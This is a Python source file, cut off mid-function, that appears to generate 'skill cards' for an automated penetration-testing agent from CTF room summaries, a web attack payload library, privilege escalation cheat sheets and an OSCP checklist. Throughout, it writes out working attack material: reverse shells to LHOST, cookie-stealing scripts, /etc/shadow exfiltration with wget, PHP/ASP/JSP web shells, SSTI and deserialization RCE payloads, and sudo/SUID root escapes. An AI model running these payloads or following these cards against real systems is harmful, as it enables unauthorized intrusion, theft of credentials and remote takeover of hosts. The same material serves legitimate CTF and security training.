    THMRoom("Alfred", "easy", "windows", "Jenkins default creds → Groovy script console → shell", "Token impersonation (incognito) → SYSTEM", ["nmap", "msfconsole"], ["jenkins", "token-impersonation"], ["Jenkins script console = instant RCE"]),
    THMRoom("HackPark", "medium", "windows", "BlogEngine.NET → authenticated RCE → shell", "WinPEAS → AutoLogon creds → WindowsScheduler → SYSTEM", ["nmap", "hydra", "winpeas"], ["blogengine", "autologon", "scheduler"], ["AutoLogon credentials in registry"]),
    THMRoom("Game Zone", "easy", "linux", "SQLi login bypass → SQLMap database dump → SSH creds", "SSH tunnel → Webmin CVE → root", ["sqlmap", "ssh", "chisel"], ["sqli", "webmin", "ssh-tunnel"], ["SQLi can chain to credential extraction"]),
    THMRoom("Skynet", "easy", "linux", "Samba → SquirrelMail creds → Cuppa CMS RFI → shell", "Cron tar wildcard injection → root", ["smbclient", "gobuster", "nc"], ["samba", "squirrelmail", "rfi", "tar-wildcard"], ["Tar wildcard injection is a classic privesc"]),
    THMRoom("Daily Bugle", "hard", "linux", "Joomla CVE-2017-8917 SQLi → admin hash → template RCE", "yum sudo NOPASSWD → GTFOBins → root", ["joomscan", "sqlmap", "hashcat"], ["joomla", "sqli", "sudo-yum"], ["Joomla SQLi + template editing = shell"]),
    THMRoom("Overpass", "easy", "linux", "ROT13 'encrypted' cookie → admin → SSH key", "Cron fetches from /etc/hosts controlled URL → root", ["nmap", "gobuster"], ["cookie-manipulation", "cron-hosts"], ["Never trust client-side 'encryption'"]),
    THMRoom("Relevant", "medium", "windows", "SMB writable share in IIS webroot → ASPX shell", "PrintSpoofer / SEImpersonate → SYSTEM", ["smbclient", "msfvenom"], ["smb", "iis", "printspoofer"], ["SMB shares mapped to web roots = web shell upload"]),
    THMRoom("Internal", "hard", "linux", "WordPress → admin → theme editor → shell → Jenkins on Docker", "Docker → host mount → credentials → SSH root", ["wpscan", "hydra"], ["wordpress", "docker", "jenkins"], ["Docker containers often have host mounts"]),
    THMRoom("Mr Robot", "medium", "linux", "WordPress → Dirbuster finds /key-1 and /fsocity.dic → WP brute → theme editor", "SUID nmap interactive → root", ["wpscan", "hydra", "nmap"], ["wordpress", "suid-nmap"], ["Nmap interactive mode = root shell"]),
    THMRoom("Retro", "hard", "windows", "WordPress → author post reveals creds → RDP login", "CVE-2017-0213 COM exploit → SYSTEM", ["nmap", "rdesktop"], ["wordpress", "rdp", "cve"], ["Blog posts can contain credential hints"]),
    THMRoom("Brainpan", "hard", "linux", "Buffer overflow in custom binary on port 9999 → shell", "sudo anansi_util (manual) → man page shell escape → root", ["nmap", "gdb", "msfvenom"], ["bof", "sudo-man"], ["Buffer overflow fundamentals"]),
    THMRoom("Wonderland", "medium", "linux", "Rabbit hole web app → hidden creds in page source → SSH", "Python library hijacking → PATH manipulation → root", ["nmap", "gobuster"], ["web", "steganography", "python-library-hijack"], ["Page source code may contain hidden credentials"]),
    THMRoom("Tomghost", "easy", "linux", "Ghostcat (CVE-2020-1938) AJP → read WEB-INF/cred.xml → SSH", "PGP key crack → sudo zip → root", ["nmap", "ajpshooter"], ["tomcat", "ajp", "ghostcat", "pgp"], ["AJP connector often exposed unnecessarily"]),
    THMRoom("Year of the Rabbit", "easy", "linux", "FTP anon → hidden dir → CSS comment hints → Brainfuck encoded creds", "sudo vi → :!/bin/bash → root", ["nmap", "ftp", "vi"], ["ftp", "brainfuck", "sudo-vi"], ["CTF-style encoding chains"]),
    THMRoom("Dogcat", "medium", "linux", "PHP LFI → log poisoning → shell → Docker escape", "Docker container → host /opt/backups mount → escape", ["nmap", "curl"], ["lfi", "log-poisoning", "docker-escape"], ["LFI + log poisoning is a classic RCE chain"]),
    THMRoom("Anthem", "easy", "windows", "OSINT → poem reveals admin name → password in robots.txt → RDP", "Hidden admin password in C:\\backup → admin login", ["nmap", "rdesktop"], ["osint", "rdp", "hidden-files"], ["robots.txt can contain sensitive info"]),
    THMRoom("RootMe", "easy", "linux", "PHP file upload bypass (phtml extension) → shell", "SUID python → python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", ["nmap", "gobuster"], ["file-upload-bypass", "suid-python"], ["Extension blacklists can be bypassed"]),
]


# ─────────────────────────── Web Exploitation Patterns ───────────────────────────

WEB_ATTACK_PATTERNS = {
    "ssti": {
        "description": "Server-Side Template Injection — inject template expressions for RCE",
        "detection": [
            "{{7*7}} → 49 (Jinja2/Twig)",
            "${7*7} → 49 (FreeMarker/Velocity)",
            "<%=7*7%> → 49 (ERB/EJS)",
            "#{7*7} → 49 (Ruby)",
            "{{7*'7'}} → 7777777 (Jinja2 confirmation)",
        ],
        "exploitation": {
            "jinja2": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "twig": "{{['id']|filter('system')}}",
            "freemarker": "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}",
            "erb": "<%= system('id') %>",
            "velocity": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()",
        },
        "tools": ["tplmap", "SSTImap"],
        "bypass_filters": [
            "URL encode: %7B%7B7*7%7D%7D",
            "Unicode: ﹛﹛7*7﹜﹜",
            "Concatenation: {{'id'|attr('__class__')}}",
        ],
    },
    "lfi": {
        "description": "Local File Inclusion — read arbitrary files or achieve RCE",
        "basic_paths": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",  # Double encoding bypass
            "..%252f..%252f..%252fetc/passwd",  # Double URL encode
        ],
        "php_wrappers": [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input  (POST data as code)",
            "expect://id",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "phar://uploads/shell.phar",
        ],
        "log_poisoning": [
            "Inject PHP in User-Agent → include /var/log/apache2/access.log",
            "Inject PHP in SSH auth → include /var/log/auth.log",
            "Inject PHP in SMTP → include /var/log/mail.log",
        ],
        "windows_paths": [
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\windows\\win.ini",
            "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\",
        ],
        "interesting_files": [
            "/etc/passwd", "/etc/shadow", "/etc/hosts",
            "/proc/self/environ", "/proc/self/cmdline",
            "/home/*/.ssh/id_rsa", "/home/*/.bash_history",
            "/var/www/html/wp-config.php", "/var/www/html/.env",
            "/etc/apache2/sites-enabled/000-default.conf",
        ],
    },
    "ssrf": {
        "description": "Server-Side Request Forgery — access internal services",
        "payloads": [
            "http://127.0.0.1:PORT/",
            "http://localhost:PORT/",
            "http://0.0.0.0:PORT/",
            "http://[::]:PORT/",
            "http://0x7f000001:PORT/",  # Hex IP
            "http://2130706433:PORT/",  # Decimal IP
            "http://017700000001:PORT/",  # Octal IP
            "http://internal-hostname:PORT/",
        ],
        "bypass_filters": [
            "URL encode: http://%31%32%37%2e%30%2e%30%2e%31",
            "DNS rebinding: attacker domain resolves to 127.0.0.1",
            "Redirect: HTTP redirect from attacker server to internal IP",
            "@ bypass: http://evil.com@127.0.0.1",
            "# bypass: http://127.0.0.1#@evil.com",
        ],
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/  (AWS)",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure)",
            "http://metadata.google.internal/computeMetadata/v1/  (GCP)",
        ],
        "internal_services": [
            "Redis: SLAVEOF, CONFIG SET",
            "Elasticsearch: _search, _cluster",
            "Memcached: stats, get",
            "Docker API: /containers/json",
        ],
    },
    "deserialization": {
        "description": "Insecure deserialization — manipulate serialized objects for RCE",
        "java": {
            "detection": "rO0AB (base64) or AC ED 00 05 (hex) in requests/cookies",
            "tools": ["ysoserial", "GadgetProbe"],
            "common_gadgets": ["CommonsCollections1-7", "CommonsBeanutils1", "Spring1-4"],
            "example": "java -jar ysoserial.jar CommonsCollections1 'bash -c {echo,BASE64_REV_SHELL}|{base64,-d}|{bash,-i}' | base64",
        },
        "php": {
            "detection": "O:4:\"User\":2:{...} or a:2:{...} in cookies/parameters",
            "tools": ["phpggc"],
            "example": "phpggc Laravel/RCE1 system 'id' | base64",
        },
        "python": {
            "detection": "pickle data (\\x80\\x05), YAML unsafe load, marshal",
            "example": "import pickle; pickle.dumps(type('X',(),{'__reduce__':lambda s:(__import__('os').system,('id',))})())",
        },
        "dotnet": {
            "detection": "ViewState, AAEAAAD/// (base64)",
            "tools": ["ysoserial.net"],
        },
    },
    "xss_to_rce": {
        "description": "Cross-Site Scripting chains to Remote Code Execution",
        "stored_xss_admin_steal": [
            "<script>fetch('http://LHOST/cookie?c='+document.cookie)</script>",
            "<img src=x onerror=\"fetch('http://LHOST/?c='+document.cookie)\">",
        ],
        "xss_to_shell": [
            "Steal admin session → access admin panel → file upload → web shell",
            "Steal admin session → modify PHP template → inject system() → RCE",
            "XSS in support ticket → steal agent cookie → access internal tools",
        ],
    },
    "command_injection": {
        "description": "OS Command Injection — execute system commands through web inputs",
        "payloads": [
            "; id", "| id", "|| id", "& id", "&& id",
            "$(id)", "`id`",
            "| bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'",
            "; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"LHOST\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        ],
        "blind_detection": [
            "; sleep 5", "| sleep 5", "$(sleep 5)",
            "; ping -c 3 LHOST", "| curl http://LHOST/$(id|base64)",
        ],
        "filter_bypass": [
            "Spaces: ${IFS} or %09 (tab) or {cat,/etc/passwd}",
            "Slashes: ${PATH:0:1}",
            "Keywords: c'a't /etc/passwd or c\"a\"t /etc/passwd",
            "Base64: echo BASE64 | base64 -d | bash",
            "Hex: echo 6964 | xxd -r -p | bash",
            "Newline: %0a",
        ],
    },
    "file_upload": {
        "description": "File upload vulnerabilities for web shell deployment",
        "bypass_techniques": [
            "Double extension: shell.php.jpg",
            "Null byte: shell.php%00.jpg (PHP < 5.3.4)",
            "Case variation: shell.pHp, shell.PHP",
            "Alternative extensions: .phtml, .php3, .php4, .php5, .phar, .phps",
            "MIME type: change Content-Type to image/jpeg",
            "Magic bytes: GIF89a<?php system($_GET['cmd']); ?>",
            "Polyglot: embed PHP in valid JPEG EXIF data",
            ".htaccess: upload .htaccess with AddType application/x-httpd-php .txt",
            "Race condition: upload + access before delete",
        ],
        "shell_payloads": {
            "php": "<?php system($_GET['cmd']); ?>",
            "php_obfuscated": "<?=`$_GET[0]`?>",
            "asp": "<%eval request(\"cmd\")%>",
            "aspx": "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \" + Request[\"cmd\"]);%>",
            "jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
        },
    },
    "api_attacks": {
        "description": "API exploitation patterns",
        "techniques": [
            "IDOR: change user_id in /api/users/1 to /api/users/2",
            "Mass assignment: add admin=true to registration JSON",
            "JWT none algorithm: change alg to 'none', remove signature",
            "JWT weak secret: hashcat -m 16500 jwt.txt wordlist.txt",
            "GraphQL introspection: {__schema{types{name,fields{name}}}}",
            "Rate limit bypass: X-Forwarded-For header rotation",
            "BOLA: /api/v1/orders/{order_id} → enumerate other users' orders",
        ],
    },
}


# ─────────────────────────── Privilege Escalation Encyclopedia ───────────────────────────

LINUX_PRIVESC_TECHNIQUES = {
    "suid_binaries": {
        "find_command": "find / -perm -4000 -type f 2>/dev/null",
        "common_exploitable": {
            "nmap": "nmap --interactive → !sh",
            "vim": "vim -c ':!/bin/bash'",
            "nano": "nano → Ctrl+R Ctrl+X → reset; bash 1>&0 2>&0",
            "find": "find . -exec /bin/bash -p \\;",
            "bash": "bash -p",
            "python": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "perl": "perl -e 'exec \"/bin/bash\"'",
            "ruby": "ruby -e 'exec \"/bin/bash\"'",
            "php": "php -r 'exec(\"/bin/bash -p\")'",
            "env": "env /bin/bash -p",
            "cp": "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p",
            "pkexec": "CVE-2021-4034 PwnKit",
            "systemctl": "systemctl → !sh (through pager)",
            "openssl": "openssl req -x509 -newkey rsa:4096 -keyout /dev/null -out /dev/null -nodes -subj '/CN=a' -engine ./lib.so",
        },
        "reference": "https://gtfobins.github.io/",
    },
    "sudo_exploits": {
        "check_command": "sudo -l",
        "common_exploitable": {
            "ALL": "sudo su OR sudo bash",
            "vi/vim": "sudo vi → :!/bin/bash",
            "less/more": "sudo less /etc/passwd → !bash",
            "man": "sudo man man → !bash",
            "awk": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
            "tar": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
            "zip": "sudo zip /tmp/x.zip /tmp/x -T --unzip-command='bash -c bash'",
            "docker": "sudo docker run -v /:/host -it alpine chroot /host bash",
            "pip": "sudo pip install . (setup.py with os.system)",
            "wget": "sudo wget --post-file=/etc/shadow http://LHOST/",
            "apache2": "sudo apache2 -f /etc/shadow (error reveals content)",
            "mysql": "sudo mysql -e '\\! bash'",
            "knife": "sudo knife exec -E 'exec \"/bin/bash\"'",
            "journalctl": "sudo journalctl → !bash (if terminal small enough)",
        },
        "env_vars": {
            "LD_PRELOAD": "If SETENV allowed: compile malicious .so, sudo LD_PRELOAD=./evil.so command",
            "LD_LIBRARY_PATH": "Replace library used by sudo command",
            "PYTHONPATH": "If sudo runs python: inject malicious module",
        },
    },
    "capabilities": {
        "find_command": "getcap -r / 2>/dev/null",
        "exploitable": {
            "cap_setuid": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "cap_dac_read_search": "Read any file: tar czf /tmp/shadow.tar.gz /etc/shadow",
            "cap_net_raw": "Packet sniffing: tcpdump -i any -w /tmp/capture.pcap",
            "cap_sys_admin": "Mount filesystems: mount -o bind /etc/shadow /tmp/shadow",
            "cap_sys_ptrace": "Inject into root processes",
        },
    },
    "cron_jobs": {
        "find_commands": [
            "cat /etc/crontab",
            "ls -la /etc/cron.*",
            "crontab -l",
            "pspy (monitor processes without root)",
        ],
        "exploitation": [
            "Writable script in cron → replace with reverse shell",
            "Wildcard injection: tar with --checkpoint-action in directory",
            "PATH manipulation: cron uses relative path → create fake binary",
            "Writable /etc/crontab → add new cron as root",
        ],
    },
    "kernel_exploits": {
        "check": "uname -a && cat /etc/os-release",
        "common": {
            "DirtyCow": "CVE-2016-5195 — Linux < 4.8.3 (write to read-only memory)",
            "DirtyPipe": "CVE-2022-0847 — Linux 5.8-5.16.11 (overwrite read-only files)",
            "PwnKit": "CVE-2021-4034 — polkit pkexec (almost all Linux)",
            "Baron_Samedit": "CVE-2021-3156 — sudo < 1.9.5p2 (heap overflow)",
            "OverlayFS": "CVE-2023-0386 / CVE-2023-2640 / CVE-2023-32629",
            "Looney_Tunables": "CVE-2023-4911 — glibc ld.so (buffer overflow)",
        },
        "tools": ["linux-exploit-suggester", "linux-exploit-suggester-2", "LinPEAS"],
    },
    "container_escapes": {
        "docker_socket": "docker run -v /:/host -it alpine chroot /host bash",
        "docker_group": "docker run -v /:/host -it alpine chroot /host bash (if in docker group)",
        "privileged_container": "mount host filesystem from within privileged container",
        "cgroup_escape": "Write to release_agent in cgroup v1 → execute on host",
        "lxd_group": "lxd init → import alpine image → mount /root → root",
        "runc_escape": "CVE-2019-5736 — overwrite runc binary through /proc/self/exe",
    },
    "password_hunting": {
        "commands": [
            "grep -r 'password' /var/www/ 2>/dev/null",
            "grep -r 'PASSWORD' /etc/ 2>/dev/null",
            "find / -name '*.conf' -exec grep -l 'password' {} \\; 2>/dev/null",
            "find / -name '.env' 2>/dev/null",
            "cat /home/*/.bash_history",
            "cat /home/*/.mysql_history",
            "find / -name 'wp-config.php' 2>/dev/null",
            "find / -name 'config.php' -o -name 'db.php' -o -name 'database.php' 2>/dev/null",
        ],
    },
}

WINDOWS_PRIVESC_TECHNIQUES = {
    "token_impersonation": {
        "tools": ["JuicyPotato", "PrintSpoofer", "RoguePotato", "GodPotato", "SharpEfsPotato"],
        "requirement": "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
        "check": "whoami /priv",
    },
    "service_exploits": {
        "unquoted_paths": "wmic service get name,displayname,pathname,startmode | findstr /i 'Auto' | findstr /v /i 'C:\\Windows'",
        "weak_permissions": "accesschk.exe -wuvc 'Everyone' * OR sc qc ServiceName",
        "dll_hijacking": "Replace DLL in service path with malicious DLL",
    },
    "always_install_elevated": {
        "check": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        "exploit": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o shell.msi → msiexec /quiet /qn /i shell.msi",
    },
    "ad_attacks": {
        "kerberoasting": "GetUserSPNs.py -dc-ip DC_IP DOMAIN/user:password → crack TGS hashes",
        "asreproasting": "GetNPUsers.py -dc-ip DC_IP DOMAIN/ -usersfile users.txt -no-pass → crack AS-REP hashes",
        "dcsync": "secretsdump.py DOMAIN/admin:password@DC_IP → dump all hashes",
        "golden_ticket": "ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN Administrator",
        "pass_the_hash": "psexec.py -hashes LM:NT DOMAIN/admin@TARGET",
        "gpp_decrypt": "gpp-decrypt ENCRYPTED_CPASSWORD (Group Policy Preferences)",
        "bloodhound": "bloodhound-python -d DOMAIN -u user -p password -ns DC_IP -c all",
    },
}


# ─────────────────────────── OSCP Methodology ───────────────────────────

OSCP_METHODOLOGY = {
    "phase_1_recon": {
        "description": "Systematic enumeration of all attack surface",
        "steps": [
            "Full TCP scan: nmap -sV -sC -p- -oA full TARGET",
            "UDP top ports: nmap -sU --top-ports 20 TARGET",
            "Version detection: nmap -sV -p PORTS TARGET",
            "Script scanning: nmap --script=vuln -p PORTS TARGET",
            "Service-specific enum: see phase 2",
        ],
    },
    "phase_2_enum": {
        "web": [
            "whatweb URL",
            "gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak",
            "gobuster vhost -u URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "nikto -h URL",
            "Check robots.txt, sitemap.xml, .git/, .env, backup files",
            "wpscan --url URL --enumerate ap,at,tt,cb,dbe,u",
            "View source code for comments, hidden forms, API endpoints",
        ],
        "smb": [
            "smbclient -L //TARGET -N",
            "smbmap -H TARGET",
            "enum4linux -a TARGET",
            "crackmapexec smb TARGET --shares",
        ],
        "ftp": [
            "ftp TARGET → anonymous login",
            "Check for writable directories",
            "Check FTP version for CVEs",
        ],
        "dns": [
            "dig axfr DOMAIN @TARGET",
            "dnsrecon -d DOMAIN -n TARGET",
            "dig any DOMAIN @TARGET",
        ],
        "snmp": [
            "snmpwalk -v2c -c public TARGET",
            "snmp-check TARGET",
            "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET",
        ],
    },
    "phase_3_exploit": {
        "checklist": [
            "Search CVEs for all identified service versions",
            "Try default credentials for all login portals",
            "Test for SQL injection on all input fields",
            "Check for SSTI, command injection, LFI, SSRF",
            "File upload testing with multiple bypass techniques",
            "Bruteforce with hydra if no other option",
            "Check searchsploit for all services",
        ],
    },
    "phase_4_privesc": {
        "linux_checklist": [
            "sudo -l",
            "find / -perm -4000 2>/dev/null (SUID)",
            "getcap -r / 2>/dev/null (capabilities)",
            "cat /etc/crontab && ls -la /etc/cron.*",
            "id (check groups: docker, lxd, disk, adm)",
            "uname -a (kernel version)",
            "find / -writable -type f 2>/dev/null",
            "grep -r password /var/www/ /opt/ /home/ 2>/dev/null",
            "cat /home/*/.bash_history",
            "env (environment variables)",
            "LinPEAS, LinEnum, linux-smart-enumeration",
        ],
        "windows_checklist": [
            "whoami /all (privileges + groups)",
            "systeminfo (OS version, hotfixes)",
            "wmic service get name,pathname (unquoted paths)",
            "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "cmdkey /list (saved credentials)",
            "dir /s /b C:\\Users\\*.txt C:\\Users\\*.ini C:\\Users\\*.cfg 2>nul",
            "PowerUp.ps1, WinPEAS, Seatbelt",
        ],
    },
}


# ─────────────────────────── Skill Card Generator ───────────────────────────

def generate_htb_skill_cards() -> List[Dict[str, Any]]:
    """Generate SkillCard-compatible dicts from HTB machine database."""
    cards = []

    # Full machine entries
    full_machines = [
        HTB_LAME, HTB_BLUE, HTB_JERRY, HTB_NIBBLES, HTB_SHOCKER, HTB_BEEP,
        HTB_OPTIMUM, HTB_GRANDPA, HTB_LEGACY, HTB_ARCTIC, HTB_BANK,
        HTB_POISON, HTB_NINEVEH, HTB_BLOCKY, HTB_SENSE, HTB_IRKED,
        HTB_FRIENDZONE, HTB_BUFF, HTB_DELIVERY, HTB_KNIFE, HTB_PREVISE,
        HTB_PHOTOBOMB, HTB_FORGE, HTB_UNICODE, HTB_AWKWARD,
    ]

    for m in full_machines:
        # Foothold skill
        cards.append({
            "id": f"htb_{m.name.lower()}_foothold",
            "if_condition": f"Target has services matching {m.name} pattern: {', '.join(f'{p[0]}/{p[1]}' for p in m.services[:3])}",
            "then_action": m.initial_foothold,
            "why": f"HTB {m.name} ({m.difficulty}) — {'; '.join(m.lessons[:2])}",
            "confidence": 0.90 if m.difficulty == "easy" else 0.85,
            "tags": m.tags,
            "source": f"htb_{m.name.lower()}",
        })
        # Privesc skill
        if "no privesc" not in m.privesc_method.lower() and "direct" not in m.privesc_method.lower():
            cards.append({
                "id": f"htb_{m.name.lower()}_privesc",
                "if_condition": f"Have user shell on {m.os} system similar to HTB {m.name}",
                "then_action": m.privesc_method,
                "why": f"HTB {m.name} privesc — {m.lessons[-1] if m.lessons else 'standard technique'}",
                "confidence": 0.88 if m.difficulty == "easy" else 0.82,
                "tags": m.tags + ["privesc"],
                "source": f"htb_{m.name.lower()}",
            })

    # Extended machines (concise format)
    for name, os_type, diff, technique, privesc, tags in HTB_MACHINES_EXTENDED:
        cards.append({
            "id": f"htb_{name.lower().replace(' ', '_')}_foothold",
            "if_condition": f"Target matches HTB {name} ({os_type}/{diff}) pattern",
            "then_action": technique,
            "why": f"HTB {name} exploitation chain",
            "confidence": 0.87,
            "tags": tags,
            "source": f"htb_{name.lower()}",
        })
        if "direct" not in privesc.lower():
            cards.append({
                "id": f"htb_{name.lower().replace(' ', '_')}_privesc",
                "if_condition": f"User shell on {os_type} matching HTB {name}",
                "then_action": privesc,
                "why": f"HTB {name} privilege escalation",
                "confidence": 0.85,
                "tags": tags + ["privesc"],
                "source": f"htb_{name.lower()}",
            })

    # TryHackMe rooms
    for room in THM_ROOMS:
        cards.append({
            "id": f"thm_{room.name.lower().replace(' ', '_')}_chain",
            "if_condition": f"Target matches THM {room.name} pattern: {', '.join(room.tags[:3])}",
            "then_action": f"{room.key_technique} → {room.privesc}",
            "why": f"TryHackMe {room.name} ({room.difficulty}) — {'; '.join(room.lessons)}",
            "confidence": 0.88,
            "tags": room.tags,
            "source": f"thm_{room.name.lower()}",
        })

    return cards


def generate_web_attack_skill_cards() -> List[Dict[str, Any]]:
    """Generate SkillCards for web exploitation patterns."""
    cards = []

    # SSTI
    cards.append({
        "id": "web_ssti_detection",
        "if_condition": "Web application with template rendering, user input reflected in page",
        "then_action": "Test {{7*7}} and ${7*7} in all input fields. If 49 appears → SSTI confirmed. "
                       "Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. "
                       "Twig: {{['id']|filter('system')}}. ERB: <%=system('id')%>",
        "why": "SSTI can lead to RCE in template engines. Test all input fields, URL params, headers.",
        "confidence": 0.92,
        "tags": ["web", "ssti", "rce"],
        "source": "web_patterns",
    })

    # LFI
    cards.append({
        "id": "web_lfi_chain",
        "if_condition": "Web app includes files via parameter (page=, file=, include=, template=, path=)",
        "then_action": "Test ../../../../etc/passwd. If filtered: try ....//....//etc/passwd, "
                       "php://filter/convert.base64-encode/resource=index.php for source code, "
                       "Log poisoning: inject PHP in User-Agent then include /var/log/apache2/access.log",
        "why": "LFI can read sensitive files and achieve RCE via log poisoning or PHP wrappers",
        "confidence": 0.93,
        "tags": ["web", "lfi", "rce"],
        "source": "web_patterns",
    })

    # SSRF
    cards.append({
        "id": "web_ssrf_internal",
        "if_condition": "Web app fetches external URLs (image upload by URL, webhook, URL preview, PDF generator)",
        "then_action": "Test http://127.0.0.1:PORT/ for internal services. Try common ports: "
                       "8080, 3000, 9200, 5000, 6379, 27017. Bypass filters with: "
                       "http://0x7f000001, http://[::], DNS rebinding. Cloud: http://169.254.169.254/",
        "why": "SSRF accesses internal services not exposed externally. Chain to Redis/Elasticsearch/Docker API for RCE",
        "confidence": 0.90,
        "tags": ["web", "ssrf", "internal"],
        "source": "web_patterns",
    })

    # Command Injection
    cards.append({
        "id": "web_command_injection",
        "if_condition": "Web app runs system commands (ping, DNS lookup, file operations, network tools)",
        "then_action": "Test: ;id, |id, $(id), `id`. Blind: ;sleep 5, |curl http://LHOST. "
                       "Filter bypass: ${IFS} for spaces, {cat,/etc/passwd} for both, "
                       "base64 encoded payloads, %0a for newlines",
        "why": "Command injection in web apps is direct RCE. Always test all input fields",
        "confidence": 0.94,
        "tags": ["web", "command-injection", "rce"],
        "source": "web_patterns",
    })

    # File Upload
    cards.append({
        "id": "web_file_upload_bypass",
        "if_condition": "Web app has file upload functionality",
        "then_action": "Try: shell.php.jpg (double ext), shell.phtml/.php3/.php5/.phar (alt ext), "
                       "change Content-Type to image/jpeg, GIF89a<?php header (magic bytes), "
                       ".htaccess upload with AddType application/x-httpd-php .txt, "
                       "polyglot JPEG with PHP in EXIF. Null byte: shell.php%00.jpg (old PHP)",
        "why": "File upload is one of the most common web shell deployment methods",
        "confidence": 0.92,
        "tags": ["web", "file-upload", "webshell"],
        "source": "web_patterns",
    })

    # Deserialization
    cards.append({
        "id": "web_deserialization",
        "if_condition": "Application uses Java (rO0AB/ACED), PHP (O:4:), Python (pickle), or .NET (ViewState) serialization",
        "then_action": "Java: ysoserial CommonsCollections1 'CMD'. PHP: phpggc Laravel/RCE1 system CMD. "
                       "Python: craft pickle payload with __reduce__. .NET: ysoserial.net",
        "why": "Insecure deserialization often leads to direct RCE without authentication",
        "confidence": 0.88,
        "tags": ["web", "deserialization", "rce"],
        "source": "web_patterns",
    })

    # API attacks
    cards.append({
        "id": "web_api_exploitation",
        "if_condition": "REST/GraphQL API endpoints discovered",
        "then_action": "Test IDOR by changing numeric IDs. Mass assignment: add admin=true/role=admin to POST. "
                       "JWT: try alg=none, crack weak secret with hashcat -m 16500. "
                       "GraphQL: query {__schema{types{name,fields{name}}}} for introspection. "
                       "Check rate limiting, parameter pollution, verb tampering (GET→PUT)",
        "why": "APIs often have weaker security than web UIs. IDOR and mass assignment are OWASP Top 10",
        "confidence": 0.90,
        "tags": ["web", "api", "idor", "jwt"],
        "source": "web_patterns",
    })

    return cards


def generate_privesc_skill_cards() -> List[Dict[str, Any]]:
    """Generate comprehensive privilege escalation skill cards."""
    cards = []

    # Linux SUID
    for binary, exploit in LINUX_PRIVESC_TECHNIQUES["suid_binaries"]["common_exploitable"].items():
        cards.append({
            "id": f"linux_suid_{binary}",
            "if_condition": f"SUID binary found: {binary}",
            "then_action": exploit,
            "why": f"SUID {binary} allows privilege escalation via GTFOBins technique",
            "confidence": 0.95,
            "tags": ["privesc", "suid", "linux"],
            "source": "gtfobins",
        })

    # Linux sudo
    for binary, exploit in LINUX_PRIVESC_TECHNIQUES["sudo_exploits"]["common_exploitable"].items():
        cards.append({
            "id": f"linux_sudo_{binary.replace('/', '_')}",
            "if_condition": f"sudo -l shows: (root) NOPASSWD: {binary}",
            "then_action": exploit,
            "why": f"sudo {binary} can be escaped to root shell",
            "confidence": 0.95,
            "tags": ["privesc", "sudo", "linux"],
            "source": "gtfobins",
        })

    # Linux capabilities
    for cap, exploit in LINUX_PRIVESC_TECHNIQUES["capabilities"]["exploitable"].items():
        cards.append({
            "id": f"linux_cap_{cap}",
            "if_condition": f"Binary with {cap} capability found",
            "then_action": exploit,
            "why": f"Linux capability {cap} allows privilege escalation",
            "confidence": 0.90,
            "tags": ["privesc", "capabilities", "linux"],
            "source": "capability_abuse",
        })

    # Kernel exploits
    for name, desc in LINUX_PRIVESC_TECHNIQUES["kernel_exploits"]["common"].items():
        cards.append({
            "id": f"linux_kernel_{name.lower()}",
            "if_condition": f"Kernel version vulnerable to {name} ({desc.split(' — ')[1] if ' — ' in desc else 'check version'})",
            "then_action": f"Use {name} exploit: {desc}",
            "why": f"Kernel exploit {name} provides direct root access",
            "confidence": 0.85,
            "tags": ["privesc", "kernel", "linux"],
            "source": "kernel_exploits",
        })

    # Container escapes
    for technique, exploit in LINUX_PRIVESC_TECHNIQUES["container_escapes"].items():
        cards.append({
            "id": f"container_escape_{technique}",
            "if_condition": f"Inside container with {technique.replace('_', ' ')} available",
            "then_action": exploit,
            "why": f"Container escape via {technique} to access host system",
            "confidence": 0.88,
            "tags": ["privesc", "container", "docker", "escape"],
            "source": "container_escapes",
        })

    # Windows privesc
    cards.append({
        "id": "windows_token_impersonation",
        "if_condition": "Windows: whoami /priv shows SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
        "then_action": "Use PrintSpoofer, JuicyPotato, GodPotato, or RoguePotato for SYSTEM shell. "
                       "PrintSpoofer: .\\PrintSpoofer.exe -i -c cmd. "
                       "JuicyPotato: .\\jp.exe -l 1337 -p cmd.exe -a '/c REVERSE_SHELL' -t *",
